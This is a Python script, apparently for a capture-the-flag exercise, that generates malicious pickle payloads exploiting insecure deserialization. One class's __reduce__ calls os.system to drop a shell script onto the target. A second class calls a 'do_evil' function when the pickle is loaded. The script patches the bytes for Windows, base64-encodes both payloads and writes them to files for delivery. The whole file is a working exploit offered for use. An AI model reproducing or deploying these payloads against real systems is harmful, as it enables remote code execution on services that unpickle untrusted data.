import pickle
import base64
import evil_rick_shell
import os

class EvilRick1(object):
    def __reduce__(self):
        with open("evil_rick_shell.py") as f:
            data = f.readlines()
        shell = "\n".join(data)
        return os.system, ("echo '{}' > evil_rick_shell.py".format(shell),)


class EvilRick2(object):
    def __reduce__(self):
        return evil_rick_shell.do_evil, ()


prick = pickle.dumps(EvilRick1())
if os.name == 'nt':
    prick = prick[0:3] + b"os" + prick[5:]
pickle_prick = base64.b64encode(prick).decode()
with open("evil_rick1.data", "w") as file:
    file.write(pickle_prick)
print(prick)

print("----")

prick = pickle.dumps(EvilRick2())
pickle_prick = base64.b64encode(prick).decode()
with open("evil_rick2.data", "w") as file:
    file.write(pickle_prick)
print(pickle_prick)
